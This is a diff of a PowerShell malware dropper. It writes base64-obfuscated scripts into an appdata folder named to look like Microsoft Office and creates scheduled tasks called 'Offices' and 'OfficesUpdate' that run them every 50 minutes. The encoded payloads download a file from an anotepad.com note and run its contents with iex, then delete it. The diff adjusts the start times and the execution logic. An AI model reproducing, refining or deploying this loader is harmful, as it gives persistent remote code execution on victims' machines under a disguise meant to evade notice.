@@ -17,24 +17,20 @@ $res  = [System.Convert]::FromBase64String("U2V0IHdTaGVsbD1DcmVhdGVPYmplY3QoIldT
 $r=[System.Text.Encoding]::UTF8.GetString($res)
 $r >> $filepath1
 
-$res  = [System.Convert]::FromBase64String("JHVybCA9ICJodHRwczovL2Fub3RlcGFkLmNvbS9ub3Rlcy84aDY0OXBxZyINCiRhdHR3ZSA9IGdldC1yYW5kb20gMTAwMDAwMDAwDQokb3V0cHV0UGF0aCA9ICIkZW52OmFwcGRhdGEvTWljcm9zb2Z0T2ZmaWNlcyINCklmICgtbm90IChUZXN0LVBhdGggJG91dHB1dFBhdGgpKSB7DQogICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkb3V0cHV0UGF0aCB8IE91dC1OdWxsDQp9DQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLU91dEZpbGUgIiRvdXRwdXRQYXRoXCRhdHR3ZSIgLVVzZUJhc2ljUGFyc2luZw0KJGE9KEdldC1JdGVtIC1QYXRoICIkb3V0cHV0UGF0aFwkYXR0d2UiKS5MZW5ndGgNCnNjIC1wYXRoICIkb3V0cHV0UGF0aFxsZW4iICRhDQo=")
+$res  = [System.Convert]::FromBase64String("JHVybCA9ICJodHRwczovL2Fub3RlcGFkLmNvbS9ub3Rlcy84aDY0OXBxZyINCiRhdHR3ZSA9IGdldC1yYW5kb20gMTAwMDAwMDAwDQokb3V0cHV0UGF0aCA9ICIkZW52OmFwcGRhdGEvTWljcm9zb2Z0T2ZmaWNlcyINCklmICgtbm90IChUZXN0LVBhdGggJG91dHB1dFBhdGgpKSB7DQogICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkb3V0cHV0UGF0aCB8IE91dC1OdWxsDQp9DQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLU91dEZpbGUgIiRvdXRwdXRQYXRoXCRhdHR3ZSIgLVVzZUJhc2ljUGFyc2luZw==")
 $r=[System.Text.Encoding]::UTF8.GetString($res)
 $r >> $filepath2
 
-$res  = [System.Convert]::FromBase64String("JGxza2QgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICIkZW52OmFwcGRhdGEvTWljcm9zb2Z0T2ZmaWNlcyIgLUZpbGUgfFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLW1hdGNoICIqLmRkIiB9DQokbGtqa2cgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICIkZW52OmFwcGRhdGEvTWljcm9zb2Z0T2ZmaWNlcyIgLUZpbGUgfFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLW1hdGNoICJsZW4iIH0NCmlmKCRsc2tkIC1uZSAkbnVsbCl7DQokbmxsbGxlPSRsc2tkWzBdLmZ1bGxuYW1lOw0KJG5sZW49JGxramtnLmZ1bGxuYW1lOw0KJGE9KEdldC1JdGVtIC1QYXRoICRubGxsbGUpLkxlbmd0aA0KJGI9Z2MgLXBhdGggJG5sZW4NCmlmKCRhIC1lcSAkYil7c2VlbiB1cGxvYWR9DQplbHNle2djICRubGxsbGUgfCBpZXg7ZGVsICRubGxsbGUgLWZvcmNlfQ0KfQ0K")
+$res  = [System.Convert]::FromBase64String("JGxza2QgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICIkZW52OmFwcGRhdGEvTWljcm9zb2Z0T2ZmaWNlcyIgLUZpbGUgfFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLW5vdG1hdGNoICJsZW4iIH0NCiRsa2prZyA9IEdldC1DaGlsZEl0ZW0gLVBhdGggIiRlbnY6YXBwZGF0YS9NaWNyb3NvZnRPZmZpY2VzIiAtRmlsZSB8V2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbWF0Y2ggImxlbiIgfQ0KaWYoJGxza2QgLW5lICRudWxsKXsNCiRubGxsbGU9JGxza2RbMF0uZnVsbG5hbWU7DQokbmxlbj0kbGtqa2cuZnVsbG5hbWU7DQokYT0oR2V0LUl0ZW0gLVBhdGggJG5sbGxsZSkuTGVuZ3RoDQokYj1nYyAtcGF0aCAkbmxlbg0KaWYoJGEgLWVxICRiKXsiREREREQiID4+ICIkZW52OmFwcGRhdGEvbG9nLnR4dCJ9DQplbHNle2djICRubGxsbGUgfCBpZXg7ZGVsICRubGxsbGUgLWZvcmNlfQ0KfQ0KZWxzZQ0Kew0KJGE9KEdldC1JdGVtIC1QYXRoICIkZW52OmFwcGRhdGEvTWljcm9zb2Z0T2ZmaWNlcy8kbHNrZFswXS5mdWxsbmFtZSIpLkxlbmd0aA0Kc2MgLXBhdGggIiRlbnY6YXBwZGF0YS9NaWNyb3NvZnRPZmZpY2VzL2xlbiIgJGENCn0=")
 $r=[System.Text.Encoding]::UTF8.GetString($res)
 $r >> $filepath3
 
 $ws = "wscript //e:vbscript " + $filepath
 $ws1 = "wscript //e:vbscript " + $filepath1
 
-schtasks /create /tn "Offices" /sc minute /tr $ws /mo 50 /F
+$st = (Get-Date).AddSeconds(15) | Get-Date -Format "HH:mm"
+$st1 = (Get-Date).AddMinutes(5) | Get-Date -Format "HH:mm"
 
-schtasks /create /tn "OfficesUpdate" /sc minute /tr $ws1 /mo 50 /F
+schtasks /create /tn "Offices" /sc minute /st $st /tr $ws /mo 50 /F
 
-schtasks /run /tn "Offices"
-sleep 5
-schtasks /run /tn "OfficeUpdate"
-
-
-
+schtasks /create /tn "OfficesUpdate" /sc minute /st $st1 /tr $ws1 /mo 50 /F
